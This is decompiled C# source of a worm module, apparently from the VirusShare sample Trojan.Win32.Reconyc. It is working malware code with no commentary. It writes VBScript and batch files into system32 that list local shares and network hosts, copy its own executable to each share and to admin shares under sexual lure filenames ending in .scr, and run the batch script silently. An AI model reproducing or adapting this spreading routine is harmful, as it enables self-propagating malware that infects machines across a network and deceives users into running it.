// Decompiled with JetBrains decompiler
// Type: WoRmy3.lan
// Assembly: WoRmy3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1B26AE86-BB0F-48C4-8B57-1FB3CCAD5BD2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.eggt-0a9369ef164691ad2732dc205399f3a03b3ae27182245bcbe5919174ce030c3c.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace WoRmy3
{
  [StandardModule]
  internal sealed class lan
  {
    public static void lan_sp()
    {
      try
      {
        StreamWriter streamWriter1 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\net.vbs", FileMode.Create, FileAccess.Write));
        streamWriter1.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter1.WriteLine("strComputer =\".\"");
        streamWriter1.WriteLine("Set objWMIService = GetObject(\"winmgmts:\"_ ");
        streamWriter1.WriteLine("& \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")");
        streamWriter1.WriteLine("Set colShares = objWMIService.ExecQuery(\"Select * from Win32_Share\")");
        streamWriter1.WriteLine("For each objShare in colShares ");
        streamWriter1.WriteLine("Stuff = objShare.Path ");
        streamWriter1.WriteLine("Set myFSO = CreateObject(\"Scripting.FileSystemObject\") ");
        streamWriter1.WriteLine("Set WriteStuff = myFSO.OpenTextFile(\"C:\\windows\\system32\\logg.txt\", 8, True)");
        streamWriter1.WriteLine("WriteStuff.WriteLine(Stuff) ");
        streamWriter1.WriteLine("WriteStuff.Close ");
        streamWriter1.WriteLine("SET WriteStuff = NOTHING ");
        streamWriter1.WriteLine("Next ");
        streamWriter1.Close();
        StreamWriter streamWriter2 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\net.bat", FileMode.Create, FileAccess.Write));
        streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter2.WriteLine("for /f \"delims=\" %%t in (C:\\windows\\system32\\logg.txt) do (");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%t\\mom_naked.scr");
        streamWriter2.WriteLine(")");
        streamWriter2.WriteLine("net view >logidylog.txt");
        streamWriter2.WriteLine("for /f \"delims=\" %%o in (logidylog.txt) do (");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$IPC\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$C\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$D\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$ADMIN\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$winnt\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$print\\mom_naked.scr");
        streamWriter2.WriteLine("net view %%o >logi.txt");
        streamWriter2.WriteLine("for /f %%m in (logi.txt) do (");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " \\\\%%o\\%%m\\sex_with_pamela_anderson_%random%.scr");
        streamWriter2.WriteLine(")");
        streamWriter2.WriteLine(")");
        streamWriter2.Close();
        Process.Start("C:\\windows\\system32\\net.vbs");
        StreamWriter streamWriter3 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\launch.vbs", FileMode.Create, FileAccess.Write));
        streamWriter3.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter3.WriteLine("Dim oShell");
        streamWriter3.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
        streamWriter3.WriteLine("oShell.run \"C:\\windows\\system32\\net.bat\",0,True");
        streamWriter3.WriteLine("Set oShell = Nothing ");
        streamWriter3.Close();
        Process.Start("C:\\windows\\system32\\launch.vbs");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
